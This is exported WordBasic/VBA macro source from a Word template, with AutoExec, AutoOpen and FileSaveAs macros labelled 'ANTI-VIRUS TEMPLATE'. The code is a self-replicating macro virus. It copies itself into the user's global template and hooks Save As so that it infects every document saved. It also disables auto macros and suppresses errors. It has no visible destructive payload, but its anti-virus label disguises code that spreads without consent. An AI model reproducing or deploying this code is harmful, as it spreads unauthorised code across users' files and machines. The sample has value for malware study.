   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ANTI-VIRUS TEMPLATE"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim sMe$
   Dim sMacro$
   WordBasic.Call "AutoExec"
   On Error GoTo -1: On Error GoTo bail
   ' add FileSaveAs to spread Anti-Virus
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":AutoExec"
       WordBasic.MacroCopy "Global:AutoExec", sMacro$
       sMacro$ = sMe$ + ":AutoOpen"
       WordBasic.MacroCopy "Global:AutoOpen", sMacro$
       sMacro$ = sMe$ + ":FileSaveAs"
       WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
   bail:
   On Error GoTo -1: On Error GoTo done
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   WordBasic.FileSaveAs dlg
   done:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ANTI-VIRUS TEMPLATE"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
     WordBasic.Call "AutoExec"
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ANTI-VIRUS TEMPLATE"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   Dim iMacroCount
   Dim i
   Dim bInstalled
   Dim bTooMuchTrouble
   Dim sMe$
   Dim sMacro$
     WordBasic.DisableAutoMacros 1
   On Error GoTo -1: On Error GoTo Abort
     iMacroCount = WordBasic.CountMacros(0, 0)
     ' See if our Anti-Virus is Already installed
     For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0, 0) = "AutoExec" Then
          bInstalled = -1
        End If
       If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
          bTooMuchTrouble = -1
        End If
     Next i
     If Not (bInstalled Or bTooMuchTrouble) Then
       ' add FileSaveAs to spread Anti-Virus
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":AutoExec"
       WordBasic.MacroCopy sMacro$, "Global:AutoExec"
       sMacro$ = sMe$ + ":AutoOpen"
       WordBasic.MacroCopy sMacro$, "Global:AutoOpen"
       sMacro$ = sMe$ + ":FileSaveAs"
       WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
     End If
   Abort:

   End Sub
